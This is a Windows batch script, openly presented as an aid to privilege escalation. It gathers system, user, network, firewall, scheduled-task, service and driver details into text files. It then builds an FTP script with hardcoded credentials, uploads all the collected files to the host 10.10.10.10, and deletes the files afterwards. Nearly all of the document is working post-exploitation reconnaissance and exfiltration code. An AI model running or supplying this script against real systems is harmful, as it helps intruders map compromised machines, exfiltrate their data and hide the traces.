@echo off
:: This batch file is used to assist with privilege escalation on Windows operating systems
:: Certain commands within this file should be updated on more recent operating systems to
:: ensure that you get the results you expect. For example, firewall commands

:: This is based on what is collected in http://fuzzysecurity.com/tutorials/16.html

echo.
echo ====================================================================================
echo [+] Initial information gathering
echo ====================================================================================
echo.

echo ------------------------------------------------------------------------------------
echo [*] System
echo ------------------------------------------------------------------------------------
systeminfo>systeminfo.txt
hostname>hostname.txt
echo %username%>username.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Users
echo ------------------------------------------------------------------------------------
net user>net-user.txt
net user %username%>net-user-username.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Networking
echo ------------------------------------------------------------------------------------
ipconfig /all>ipconfig-all.txt
route print>route.txt
arp -A>arp-a.txt
netstat -ano>netstat-ano.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Firewall
echo ------------------------------------------------------------------------------------
netsh firewall show state>netsh-firewall-show-state.txt
netsh firewall show config>netsh-firewall-show-config.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Scheduled Tasks
echo ------------------------------------------------------------------------------------
schtasks /query /fo LIST /v>scheduled-tasks.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Services
echo ------------------------------------------------------------------------------------
tasklist /SVC>services-tasklist.txt
net start>services-started.txt
echo.


echo ------------------------------------------------------------------------------------
echo [*] Drivers
echo ------------------------------------------------------------------------------------
DRIVERQUERY>driverquery.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Preparing for file transfer
echo ------------------------------------------------------------------------------------
echo open 10.10.10.10 21>ftp.txt
echo kkirsche>>ftp.txt
echo kkirsche>>ftp.txt
echo cd received>>ftp.txt
echo ascii>>ftp.txt
if exist systeminfo.txt echo PUT systeminfo.txt>>ftp.txt
if exist hostname.txt echo PUT hostname.txt>>ftp.txt
if exist username.txt echo PUT username.txt>>ftp.txt
if exist net-user.txt echo PUT net-user.txt>>ftp.txt
if exist net-user-username.txt echo PUT net-user-username.txt>>ftp.txt
if exist ipconfig-all.txt echo PUT ipconfig-all.txt>>ftp.txt
if exist route.txt echo PUT route.txt>>ftp.txt
if exist arp-a.txt echo PUT arp-a.txt>>ftp.txt
if exist netstat-ano.txt echo PUT netstat-ano.txt>>ftp.txt
if exist netsh-firewall-show-state.txt echo PUT netsh-firewall-show-state.txt>>ftp.txt
if exist netsh-firewall-show-config.txt echo PUT netsh-firewall-show-config.txt>>ftp.txt
if exist scheduled-tasks.txt echo PUT scheduled-tasks.txt>>ftp.txt
if exist services-tasklist.txt echo PUT services-tasklist.txt>>ftp.txt
if exist services-started.txt echo PUT services-started.txt>>ftp.txt
if exist driverquery.txt echo PUT driverquery.txt>>ftp.txt
echo bye>>ftp.txt
echo.


echo ------------------------------------------------------------------------------------
echo [*] Performing transfer
echo ------------------------------------------------------------------------------------
ftp -s:ftp.txt
echo.

echo ------------------------------------------------------------------------------------
echo [*] Transfer Cleanup
echo ------------------------------------------------------------------------------------
del ftp.txt
if exist systeminfo.txt del systeminfo.txt
if exist hostname.txt del hostname.txt
if exist username.txt del username.txt
if exist net-user.txt del net-user.txt
if exist net-user-username.txt del net-user-username.txt
if exist ipconfig-all.txt del ipconfig-all.txt
if exist route.txt del route.txt
if exist arp-a.txt del arp-a.txt
if exist netstat-ano.txt del netstat-ano.txt
if exist netsh-firewall-show-state.txt del netsh-firewall-show-state.txt
if exist netsh-firewall-show-config.txt del netsh-firewall-show-config.txt
if exist scheduled-tasks.txt del scheduled-tasks.txt
if exist services-tasklist.txt del services-tasklist.txt
if exist services-started.txt del services-started.txt
if exist driverquery.txt del driverquery.txt
echo.
